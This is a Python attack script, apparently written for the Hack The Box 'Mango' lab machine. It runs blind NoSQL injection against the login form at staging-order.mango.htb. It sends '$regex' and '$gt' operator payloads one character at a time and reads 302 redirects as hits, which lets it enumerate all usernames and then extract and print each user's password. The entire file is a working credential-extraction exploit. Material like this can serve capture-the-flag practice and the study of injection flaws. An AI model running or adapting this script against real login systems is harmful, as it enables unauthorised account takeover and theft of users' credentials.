import requests
import string

# proxies = {"http": "http://127.0.0.1:12480", "https": "http://127.0.0.1:12480"}
proxies = {}
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "https://staging-order.mango.htb",
    "Connection": "keep-alive",
    "Referer": "https://staging-order.mango.htb/",
    "Upgrade-Insecure-Requests": "1",
    "Host": "staging-order.mango.htb",
}

# Returns Chars: [a, c], stops at first if desired, this is useful for passwords
# Expects <CHAR>, replaces with actual char
def iterate_chars(payload, stop_at_first=False):
    valid_chars = []
    char_str = string.ascii_letters + string.digits + "~'`!@#%_=,:;/\""
    regex_escapes = [
        "\{",
        "\}",
        "\*",
        "\^",
        "\+",
        "\?",
        "\-",
        "\&",
        "\(",
        "\)",
        "\[",
        "\]",
        "\\\\",
        "\<",
        "\>",
        "\|",
    ]
    chars_to_test = list(char_str) + regex_escapes
    for i in chars_to_test:
        data = payload.replace("<CHAR>", i)
        res = requests.post(
            "http://staging-order.mango.htb/",
            data=data,
            allow_redirects=False,
            headers=headers,
            proxies=proxies,
            verify=False,
        )
        if res.status_code == 302:
            valid_chars.append(i[-1:])
            if stop_at_first:
                return valid_chars
    return valid_chars


# Iterates through all known starts to user strings, attempts to find all valid chars for each
# Returns an updated list of found users
def iterate_users(users):
    user_payload = "username[$regex]=^<CHAR>.*&password[$gt]=&login=login"
    new_found_users = []
    if len(users) == 0:
        found_users = iterate_chars(user_payload)
        print(found_users)
        return found_users
    else:
        for user in users:
            user_payload = (
                f"username[$regex]=^{user}<CHAR>.*&password[$gt]=&login=login"
            )
            new_chars = iterate_chars(user_payload)
            if len(new_chars) == 0:
                new_found_users.append(user)
            else:
                for char in new_chars:
                    new_found_users.append(user + char[-1:])
        print(new_found_users)
        return new_found_users


def find_user_password(user):
    found_chars = ""
    while True:
        pass_payload = (
            f"username={user}&password[$regex]=^{found_chars}<CHAR>.*&login=login"
        )
        new_char = iterate_chars(pass_payload, True)
        if len(new_char) == 0:
            break
        found_chars += new_char[0]
        print(f"{user}: {found_chars}")
    return found_chars


def iterate_passwords(users):
    creds = {user: "" for user in users}
    for user in creds:
        creds[user] = find_user_password(user)
    return creds


# Returns the PHP session ID as a header for requests to update with
def grab_sessid_header():
    res = requests.get(
        "http://staging-order.mango.htb/",
        headers=headers,
        proxies=proxies,
        verify=False,
    )
    phpid = res.cookies["PHPSESSID"]
    cookie_header = {"Cookie": f"PHPSESSID={phpid}"}
    return cookie_header


# Returns an array of usernames
def find_all_users():
    found_users = []
    while True:
        new_found_users = iterate_users(found_users)
        if new_found_users == found_users:
            print(found_users)
            break
        found_users = new_found_users
    return found_users


# Grab a new session id first
headers.update(grab_sessid_header())
users = find_all_users()
creds = iterate_passwords(users)
print(creds)